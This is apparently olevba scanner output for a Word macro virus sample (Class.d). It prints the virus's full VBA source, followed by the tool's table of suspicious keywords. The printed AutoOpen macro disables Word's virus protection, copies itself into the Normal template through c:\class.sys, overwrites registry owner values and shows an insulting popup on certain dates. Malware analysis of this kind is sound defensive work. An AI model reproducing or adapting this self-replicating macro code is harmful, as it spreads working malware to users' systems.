olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Saleem5/11/99 3:21:06 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Const REG_SZ As Long = 1
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Const HKEY_CURRENT_USER As Long = &H80000001
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Sub AutoOpen()
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
On Error GoTo out
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Options.VirusProtection = False
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Options.SaveNormalPrompt = False
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Options.ConfirmConversions = False
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If nt > 70 And ad > 0 Then GoTo out
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If nt < 70 Then
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End If
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
host.codemodule.AddFromFile ("c:\class.sys")
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
With host.codemodule
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    For x = 1 To 16
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    .deletelines 1
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    Next x
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End With
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If nt < 70 Then
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    With host.codemodule
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    .replaceline 1, "Sub AutoClose()"
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    .replaceline 91, "Sub ToolsMacro()"
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    For x = 70 To 81
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
        .deletelines 62
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    Next x
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    .replaceline 35, "    For x = 1 To 4"
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    End With
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End If
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If nt < 70 Then
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
u = RegCloseKey(k)
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End If
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
With host.codemodule
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    For x = 2 To 104 Step 2
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
    Next x
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End With
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
out:
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End Sub
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
Sub ViewVBCode()
'Saleem5/11/99 3:21:07 PMHP LaserJet 6P/6MP - Standard on LPT1:NOTE
End Sub
-------------------------------------------------------------------------------
VBA MACRO CyberForm 
in file: Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689 - OLE stream: 'CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



































































































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Booke
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Casper'S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WinK'S@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.Class.d-8ffd7f7cd51e679139cebf09d633c7943e8a7689' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
